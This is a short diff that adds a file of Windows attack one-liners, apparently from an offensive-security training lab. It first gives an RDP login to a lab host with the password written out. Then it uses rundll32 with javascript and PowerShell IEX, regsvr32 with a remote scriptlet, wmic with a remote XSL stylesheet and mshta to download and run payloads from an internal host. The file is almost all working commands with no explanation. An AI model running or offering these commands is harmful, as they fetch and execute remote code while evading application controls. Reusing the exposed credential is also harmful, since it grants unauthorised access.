@@ -1,0 +1,6 @@
+xfreerdp +clipboard /u:student /p:Sec565\!\! /v:student.draconem.io
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://10.254.252.3:8000/setup.ps1');")
+
+regsvr32 /s /n /u /i:http://10.254.252.3:8000/config.sct scrobj.dll
+wmic os get /format:"http://10.254.252.3:8000/update.xsl"
+mshta.exe http://10.254.252.3:8000/app.hta
